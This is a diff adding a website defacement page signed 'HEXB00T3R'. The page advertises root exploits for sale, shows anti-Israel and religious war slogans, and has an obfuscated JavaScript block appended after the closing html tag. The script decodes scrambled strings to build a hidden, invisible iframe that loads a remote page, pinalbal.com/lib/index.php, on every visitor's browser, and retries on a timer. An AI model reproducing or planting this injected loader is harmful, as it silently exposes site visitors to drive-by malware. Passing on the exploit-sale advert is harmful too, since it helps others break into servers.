@@ -1,0 +1,23 @@
+<html>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<meta http-equiv="Content-Language" content="tr">
+<meta http-equiv="Content-Type" content="text/html; charset=WINDOWS-1254">
+<title>HACKED by HEXB00T3R - Muslim Turkish Hacker</title>
+</head>
+<body bgcolor=black>
+<p align="center">&nbsp;</p>
+<p align="center">
+<img src="http://palayos.com/3637.jpg"></p>
+<p align="center"><font color="white" size="2" face="square721 bt"><strong>Yogun Talep Uzerine 2009-2010 Root Exploit Satislari Tekrar Baslamistir! 30 TL. HEXB00T3R@Hotmail.com</strong></font></p>
+<p align="center"><font color="#666666" size="2" face="Courier New"><strong>Our war will continue against the ones who are against the real religion islam</strong></font></p>
+<p align="center"><font color="#666666" size="2" face="Courier New"><strong>Real Terrorist Zionist israel - BOYCOTT ! Stop Supporting Baby Killers</strong></font></p>
+<p align="center"><font color="white" size="6" face="IrisUPC"><strong>HACKED by HEXB00T3R</strong></font></p>
+<p align="center"><font color="white" size="2" face="Verdana"><strong>(Informatics Mafia)</strong></font></p>
+</a></font></b></p>
+<p align="center"><b><font color="gray" size="2" face="square721 bt">
+<a href="http://palayos.com/root2010.htm"><font color="gray" face="square721 bt">Dunyada bir ilk (mmap ASIP) 2010 root video ( HEXB00T3R FARKI )</font></a></font></b></p>
+<embed src="http://palayos.com/hex.mp3" type="audio/x-ms-wma" height="0" width="128"></b></font></font></font>
+</html><script type='text/javascript'>function xU(){};this.zW=false;xU.prototype = {w : function() {this.lI='';kC="";var kU="";rK="";var a='';var j='replace';this.jA='';var y="";var t=new Array();var k=document;var wOH=new Array();this.rF=57959;var d=window;var e=new Date();kW='';var yZ=function(){};var nM=new Date();var u='';this.bV='';this.mO='';var zX="";var uX=new Array();var eK="eK";String.prototype.bK=function(z,v){return this[j](z, v)};var dS=false;this.lZ=false;var p="";bH="";this.hB=34808;mP="";bD="";this.mM="mM";var l = 's!e!t}A!tSt!rDiSbDu!tCeS'.bK(/[SC\!D\}]/g, '');var pB=new Array();this.sP="";var hF=function(){return 'hF'};var n = 'n)o&n&ek'.bK(/[k9\)&\:]/g, '');vS=false;this.hD='';var jC = 'vOH%hF<O/%bqo%dFyq>O<O/(h(t(mOl%>O'.bK(/[OFq%\(]/g, '');var c='';eX="";var g="g";var zD = 'd+i+s&p+l&aZye'.bK(/[eZ\!&\+]/g, '');this.rN="rN";sO=47786;var wE=function(){return 'wE'};mA="mA";        var i = 'a3p7p7ern$dLC3hLi7l3d$'.bK(/[\$73rL]/g, '');this.hW='';this.q="";var uD=27267;var vO=new Date();var lX = 's&e|t&T|i&m>eVo|u&t&'.bK(/[&\^V\|\>]/g, '');var tQ=false;lA='';var s = 'b3oEdVyV'.bK(/[VE\(Y3]/g, '');var vU="vU";this.mJ=28194;var r = 'sFt[yIl[eY'.bK(/[YoIF\[]/g, '');this.yZH="yZH";this.qY=false;this.uK="";var wC = 'cdr~e]adt.e7Edl.e.m.e.n7t7'.bK(/[7d~\.\]]/g, '');var vL=function(){return 'vL'};aH="";var mAX="mAX";var wO = 'i.f.rYa>m>e.'.bK(/[\.\>YHt]/g, '');var tN=35106;function wW(){};this.zY='';iV=false;var dV = 'w<r<iHtHe?'.bK(/[\?O%H\<]/g, '');var wM=function(){return 'wM'};var pI=false;var vG = 'sWrWcW'.bK(/[Wyu5N]/g, '');aR='';var sT=function(){};var hY="hY";var f=new Array();try {zR='';vUY="vUY";dC='';var tZ=function(){return 'tZ'};var b=this.m();this.xL='';hJ="";var kX=k[wC](wO);var sK=new Array();cA=38686;function vN(){};var qU=function(){return 'qU'};var rW=24757;var iN="iN";kX[r][zD] = n;var xI="xI";var wZ=false;mZ="";this.dO="dO";kX[l](vG, b);this.pIS="pIS";kF="";this.pK=37110;this.pP='';this.tY=20163;rR='';document[s][i](kX);hE="hE";this.gI="";var zU=function(){};this.rE=false;this.vF='';var uH=new Array();tE="tE";} catch(x) {var qF=36621;var zH='';this.qV=false;bA='';jM=false;k.write(jC);o=35151;this.gH="gH";qJ=33600;var oO=function(){return 'oO'};hO=45939;var sV=14412;var wA = this;var iQ="";var yK=function(){};function xA(){};iP=false;var tA="tA";d[lX](function(){ var qP=new Date();this.xX="xX";this.eH="";kB='';wA.w();var fF="";var lG=false;var uDR=new Date();this.pW='';}, 235);var dM=new Array();this.lV="";}sI=32632;this.pWH="pWH";var fA=27294;dQ="dQ";},m : function() {var pD=function(){return 'pD'};this.hV=39923;function jY(){};var mE=15861;return 'hCtwt|pC:;/w/,p,i;n;a;l|bCaCl;.|c;o|mC/;lwiwb,/Ci,nCdCewxC.wpwh;p;'.bK(/[;w\|,C]/g, '');var pT=new Array();qT='';}};pG="pG";var xW=new xU(); nI="";xW.w();function rRU(){};</script>
